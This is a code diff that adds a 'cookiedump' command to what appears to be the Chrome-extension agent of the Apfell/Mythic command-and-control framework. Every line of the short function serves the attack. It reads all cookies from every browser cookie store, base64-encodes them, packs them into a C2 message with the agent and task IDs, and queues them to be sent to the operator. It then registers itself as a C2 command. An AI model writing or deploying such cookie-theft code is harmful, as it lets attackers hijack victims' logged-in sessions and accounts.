@@ -1,0 +1,20 @@
+cookiedump = function() {
+    let results = [];
+    chrome.cookies.getAllCookieStores(function(stores) {
+        stores.forEach(function (store) {
+            const filter = {};
+            filter["storeId"] = store.id;
+            chrome.cookies.getAll({"storeId": store.id}, function (cookies) {
+                const data = btoa(JSON.stringify(cookies));
+                const apfellmsg = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, data);
+                let meta = {};
+                meta["metatype"] = 3;
+                meta["metadata"] = apfellmsg;
+                const metaenvelope = JSON.stringify(meta);
+                out.push(metaenvelope);
+            });
+        });
+    });
+};
+
+C2.commands[cookiedump.name] = cookiedump;
